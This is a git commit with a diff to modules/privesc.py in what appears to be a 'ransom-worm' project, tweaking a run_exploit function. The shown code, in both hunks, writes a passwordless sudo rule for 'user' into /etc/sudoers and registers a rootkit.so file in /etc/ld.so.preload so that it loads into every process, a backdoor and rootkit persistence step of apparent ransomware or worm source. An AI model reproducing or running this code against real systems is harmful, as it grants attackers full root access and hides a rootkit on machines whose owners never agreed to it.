940d117e1ef592f474d8809d8823ea7371f47b5d
blueh0rse <110935049+blueh0rse@users.noreply.github.com>
2023-12-16 13:40:42 +0100

    update privesc

--- modules/privesc.py
+++ modules/privesc.py
@@ -94,9 +94,10 @@ def run_exploit(exploit):
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
             )
-            run_command(process, f"touch /etc/ld.so.preload \n")
+            run_command(process, "touch /etc/ld.so.preload \n")
             run_command(
-                process, "echo '/home/$USER/utils/rootkit.so' >/etc/ld.so.preload \n"
+                process,
+                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
             )
             run_command(process, 'echo "exit" \n')
 
@@ -120,9 +121,10 @@ def run_exploit(exploit):
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
             )
-            run_command(process, f"touch /etc/ld.so.preload \n")
+            run_command(process, "touch /etc/ld.so.preload \n")
             run_command(
-                process, "echo '/home/$USER/utils/rootkit.so' >/etc/ld.so.preload \n"
+                process,
+                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
             )
             run_command(process, 'echo "exit" \n')
 
